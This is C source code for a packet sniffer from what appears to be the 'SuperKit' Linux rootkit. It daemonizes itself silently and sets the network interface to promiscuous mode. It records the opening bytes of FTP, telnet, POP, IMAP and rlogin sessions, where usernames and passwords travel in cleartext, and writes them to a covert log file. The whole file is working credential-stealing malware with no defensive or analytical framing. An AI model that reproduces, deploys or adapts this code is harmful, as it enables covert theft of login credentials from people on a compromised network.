// Sniffer adapted for SuperKit by mostarac <mostar@hotmail.com>
#define MAXIMUM_CAPTURE 256
#define TIMEOUT 30

#include "../include/config.h"
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <linux/if.h>
#include <signal.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <linux/socket.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/if_ether.h>
#include <sys/stat.h>
#include <fcntl.h>

int sock;
FILE *log;

struct connection 
{
	struct connection *next;

	time_t start;
	time_t lasthit;

	unsigned long saddr;
	unsigned long daddr;
	unsigned short sport;
	unsigned short dport;

	unsigned char data[MAXIMUM_CAPTURE];
	int bytes;
};

typedef struct connection *clistptr;

clistptr head,tail;

void add_node(unsigned long sa, unsigned long da,unsigned short sp,unsigned short dp)
{
	clistptr newnode;

	newnode=(clistptr)malloc(sizeof(struct connection));
	newnode->saddr=sa;
	newnode->daddr=da;
	newnode->sport=sp;
	newnode->dport=dp;
	newnode->bytes=0;
	newnode->next=NULL;
	time(&(newnode->start));
	time(&(newnode->lasthit));
	if (!head)
	{	
		head=newnode;
		tail=newnode;
	}
	else
	{
		tail->next=newnode;
		tail=newnode;
	}
}		

char *hostlookup(unsigned long int in)
{
   static char blah[1024];
   struct in_addr i;
   struct hostent *he;

   i.s_addr=in;
   he=gethostbyaddr((char *)&i, sizeof(struct in_addr),AF_INET);
   if(he == NULL) strcpy(blah, inet_ntoa(i));
   else strcpy(blah, he->h_name);
   return blah;
}

char *pretty(time_t *t)
{ 
	char *time;
	time=ctime(t);
	time[strlen(time)-6]=0;
	return time;
}

int remove_node(unsigned long sa, unsigned long da,unsigned short sp,unsigned short dp)
{
	clistptr walker,prev;
	int i=0;
	int t=0;
	if (head)
	{
	 	walker=head;
		prev=head;
		while (walker)
		{
			if (sa==walker->saddr && da==walker->daddr && sp==walker->sport && dp==walker->dport)
			{
				prev->next=walker->next;
				if (walker==head)
				{
					head=head->next;;
					prev=NULL;
				}
				if (walker==tail)
					tail=prev;
				fprintf(log,"============================================================\n");
				fprintf(log,"Time: %s     Size: %d\nPath: %s",pretty(&(walker->start)),walker->bytes,hostlookup(sa));
				fprintf(log," => %s [%d]\n------------------------------------------------------------\n",hostlookup(da),ntohs(dp));
				fflush(log);
				for (i=0;i<walker->bytes;i++)
				{
					if (walker->data[i]==13)
					{
						fprintf(log,"\n"); 
						t=0; 
					}
					if (isprint(walker->data[i]))
					{
						fprintf(log,"%c",walker->data[i]);
						t++;
					}
					if (t>75)
					{
						t=0;
						fprintf(log,"\n");
					}
				}
				fprintf(log,"\n");
				fflush(log);
				free (walker);
				return 1;	
			}
			prev=walker;
			walker=walker->next;
		}
	}	
}
int log_node(unsigned long sa, unsigned long da,unsigned short sp,unsigned short dp,int bytes,char *buffer)
{
	clistptr walker;

	walker=head;
	while (walker)
	{
		if (sa==walker->saddr && da==walker->daddr && sp==walker->sport && dp==walker->dport)
		{
			time(&(walker->lasthit));
			strncpy(walker->data+walker->bytes,buffer,MAXIMUM_CAPTURE-walker->bytes);
			walker->bytes=walker->bytes+bytes;
			if (walker->bytes>=MAXIMUM_CAPTURE)
			{
				walker->bytes=MAXIMUM_CAPTURE;
				remove_node(sa,da,sp,dp);
				return 1;
			}	
		}
		walker=walker->next;
	}
			
}	


void setup_interface(char *device);
void cleanup(int);


struct etherpacket
{
   struct ethhdr eth;
   struct iphdr  ip;
   struct tcphdr tcp;
   char buff[8192];
} ep;

struct iphdr *ip;
struct tcphdr *tcp;

void cleanup(int sig)
{
	if (sock)
   		close(sock);
	if (log)
	{
		fprintf(log,"\nExiting...\n");
		fclose(log);
	}
	exit(0);
}

void purgeidle(int sig)
{
	clistptr walker;
	time_t curtime;	
	walker=head;
	signal(SIGALRM, purgeidle);
	alarm(5);
//	printf("Purging idle connections...\n");

	time(&curtime);
	while (walker)
	{
		if (curtime - walker->lasthit  > TIMEOUT)
		{
//			printf("Removing node: %d,%d,%d,%d\n",walker->saddr,walker->daddr,walker->sport,walker->dport);
			remove_node(walker->saddr,walker->daddr,walker->sport,walker->dport);
			walker=head;
		}
		else
			walker=walker->next;
	}
}

void setup_interface(char *device)
{
	int fd;
	struct ifreq ifr;
	int s;
	
	//open up our magic SOCK_PACKET
	fd=socket(AF_INET, SOCK_PACKET, htons(ETH_P_ALL));
	if(fd < 0)
	{
		perror("cant get SOCK_PACKET socket");
		exit(0);
	}

	//set our device into promiscuous mode
	strcpy(ifr.ifr_name, device);
	s=ioctl(fd, SIOCGIFFLAGS, &ifr);
	if(s < 0)
	{
		close(fd);
		perror("cant get flags");
		exit(0);
	}
	ifr.ifr_flags |= IFF_PROMISC;
	s=ioctl(fd, SIOCSIFFLAGS, &ifr);
	if(s < 0) perror("cant set promiscuous mode");
	sock=fd;
}

int filter(void)
{
	int p;
	p=0;

	if(ip->protocol != 6) return 0;
	
	p=0;
	if (htons(tcp->dest) == 21) p= 1;
	if (htons(tcp->dest) == 23) p= 1;
	if (htons(tcp->dest) == 106) p= 1;
	if (htons(tcp->dest) == 109) p= 1;
	if (htons(tcp->dest) == 110) p= 1;
	if (htons(tcp->dest) == 143) p= 1;
	if (htons(tcp->dest) == 513) p= 1;
	if (!p) return 0;
		
	if(tcp->syn == 1)
	{
//		printf("Adding node syn %d,%d,%d,%d.\n",ip->saddr,ip->daddr,tcp->source,tcp->dest);
		add_node(ip->saddr,ip->daddr,tcp->source,tcp->dest);
	}
	if (tcp->rst ==1)
	{
//		printf("Removed node rst %d,%d,%d,%d.\n",ip->saddr,ip->daddr,tcp->source,tcp->dest);
		remove_node(ip->saddr,ip->daddr,tcp->source,tcp->dest);
	}
	if (tcp->fin ==1)
	{
//		printf("Removed node fin %d,%d,%d,%d.\n",ip->saddr,ip->daddr,tcp->source,tcp->dest);
		remove_node(ip->saddr,ip->daddr,tcp->source,tcp->dest);
	}
	log_node(ip->saddr,ip->daddr,tcp->source,tcp->dest,htons(ip->tot_len)-sizeof(ep.ip)-sizeof(ep.tcp), ep.buff-2);
}


void main(int argc, char *argv[])
{
	int x,dn;	
	clistptr c;
	head=tail=NULL;

	ip=(struct iphdr *)(((unsigned long)&ep.ip)-2);
	tcp=(struct tcphdr *)(((unsigned long)&ep.tcp)-2);

	if (fork()==0)
	{
		close(0); close(1); close(2);
		setsid();
		dn=open("/dev/null",O_RDWR);
		dup2(0,dn); dup2(1,dn); dup2(2,dn);
		close(dn);
		setup_interface("eth0");

		signal(SIGHUP, SIG_IGN);
		signal(SIGINT, cleanup);
		signal(SIGTERM, cleanup);
		signal(SIGKILL, cleanup);
		signal(SIGQUIT, cleanup);
		signal(SIGALRM, purgeidle);
	
		log=fopen(SKSNIFFLOG,"a");
   	if (log == NULL) 
		{ 
			fprintf(stderr, "cant open log\n");
			exit(0);
		}

		alarm(5);

		while (1)
		{
			x=read(sock, (struct etherpacket *)&ep, sizeof(struct etherpacket));
			if (x>1)
			{
				filter();
			}
		}
	}
}
